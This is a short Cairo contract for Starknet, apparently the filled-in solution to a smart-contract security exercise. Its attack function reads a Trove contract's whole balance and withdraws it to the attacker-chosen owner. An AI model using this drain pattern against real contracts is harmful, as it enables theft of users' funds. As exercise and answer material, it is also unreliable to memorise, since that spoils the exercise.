#[starknet::interface]
pub trait IAttack<TContractState> {
    fn attack(ref self: TContractState) -> ();
}

#[starknet::contract]
mod Attack {
    use pharaonik::interfaces::ITrove::{ITroveDispatcher, ITroveDispatcherTrait};
    use pharaonik::utils::errors::Errors;
    use core::zeroable::Zeroable;
    use core::starknet::{
        get_caller_address, get_contract_address, ContractAddress, ClassHash,
        contract_address_to_felt252
    };

    #[storage]
    struct Storage {
        trove: ITroveDispatcher,
        owner: ContractAddress
    }

    #[constructor]
    fn constructor(
        ref self: ContractState, _trove_address: ContractAddress, _owner: ContractAddress
    ) {
        assert(!_trove_address.is_zero(), Errors::ZERO_ADDRESS);
        assert(!_owner.is_zero(), Errors::ZERO_ADDRESS);
        self.trove.write(ITroveDispatcher { contract_address: _trove_address });
        self.owner.write(_owner);
    }

    #[abi(embed_v0)]
    pub impl Attack of super::IAttack<ContractState> {
        // @todo Complete the below attack fuction to solve this exercise
        fn attack(ref self: ContractState) -> () {
            let amount = self.trove.read().get_balance();
            self.trove.read().withdraw(amount, self.owner.read());
        }
    }
}
